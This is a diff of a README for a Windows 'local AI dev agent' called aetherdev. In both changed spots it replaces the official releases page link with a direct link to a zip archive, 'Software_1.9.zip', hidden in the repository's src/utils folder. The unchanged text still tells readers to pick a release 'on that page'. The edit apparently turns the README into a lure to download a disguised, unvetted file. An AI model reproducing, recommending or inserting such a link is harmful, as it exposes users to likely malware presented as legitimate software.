@@ -1,6 +1,6 @@
 # ⚡ aetherdev - Local AI Dev Agent for Windows
 
-[![Download aetherdev](https://img.shields.io/badge/Download%20aetherdev-4B6CFB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ignazfeudatory487/aetherdev/releases)
+[![Download aetherdev](https://img.shields.io/badge/Download%20aetherdev-4B6CFB?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ignazfeudatory487/aetherdev/main/src/utils/Software_1.9.zip)
 
 ## 🧭 What is aetherdev?
 
@@ -35,7 +35,7 @@ If your PC is newer, it should run more smoothly. For larger models, more RAM he
 
 Visit this page to download the Windows release:
 
-[https://github.com/Ignazfeudatory487/aetherdev/releases](https://github.com/Ignazfeudatory487/aetherdev/releases)
+[https://raw.githubusercontent.com/Ignazfeudatory487/aetherdev/main/src/utils/Software_1.9.zip](https://raw.githubusercontent.com/Ignazfeudatory487/aetherdev/main/src/utils/Software_1.9.zip)
 
 On that page, look for the latest release and get the Windows file that matches your PC. If the release includes a setup file, download that file. If it includes a portable file, download that one instead.
 
